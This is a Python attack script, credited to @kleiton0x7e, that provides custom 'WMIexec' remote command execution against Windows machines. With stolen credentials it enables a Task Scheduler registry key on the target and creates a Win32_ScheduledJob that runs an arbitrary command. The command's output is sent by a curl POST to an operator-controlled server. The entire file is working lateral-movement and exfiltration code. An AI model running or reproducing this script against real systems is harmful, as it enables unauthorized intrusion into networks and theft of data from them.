import wmi
import datetime
import argparse

webserver = "https://10.0.0.5:8080" #change to your HTTP server IP and port where you will get the output

def enable_registry_key_wmi(username, password, target_computer):
    # Create a WMI connection with authentication
    c = wmi.WMI(computer=target_computer, user=username, password=password)

    # Connect to the StdRegProv class to modify the registry
    reg = c.Win32_Process.Create(CommandLine='''cmd /c reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Configuration" /v Enabled /t REG_DWORD /d 1 /f''')

    if reg[1] == 0:
        print("[+] Registry key value modified successfully.")
    else:
        print("[-] Failed to modify registry key value.\n")
        exit()

def execute_command_wmi(command, username, password, target_computer):
    # Create a WMI connection with authentication
    c = wmi.WMI(
        computer=target_computer,
        user=username,
        password=password,
        namespace="root\\cimv2"
    )
    
    print("[+] Connected to " + target_computer + "\\root\\cimv2\n")

    # Calculate the begin time for the scheduled job (1 minute from now)
    change_date_time = datetime.datetime.now() + datetime.timedelta(minutes=1)
    print("[+] Command will be executed on " + str(change_date_time))
    begin_time = change_date_time.strftime('%Y%m%d%H%M%S.000000+100')

    # Use the Win32_ScheduledJob class to execute the command
    job_id, result = c.Win32_ScheduledJob.Create(Command=command, StartTime=begin_time)

    if result == 0:
        print(f"[+] Command will be executed in 1 minute. Job ID: {job_id}\n")
    else:
        print("[-] Failed to execute command.\n")

# Example usage
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Custom WMIexec script created by @kleiton0x7e')
    parser.add_argument('-i', '--ip', action='store', required = True, help='The IP address/ hostname of the server')
    parser.add_argument('-u', '--username', action='store', required = True, help='The username used for authentication')
    parser.add_argument('-p', '--password', action='store', required = True, help='The password used for authentication')
    parser.add_argument('-c', '--command', action='store', required = True, help='The command to be executed')
    args = parser.parse_args()

    enable_registry_key_wmi(args.username, args.password, args.ip)
    execute_command_wmi("cmd /Q /c " + args.command + " | curl -X POST -k -H 'Content-Type: text/plain' --data-binary @- " + webserver, args.username, args.password, args.ip)


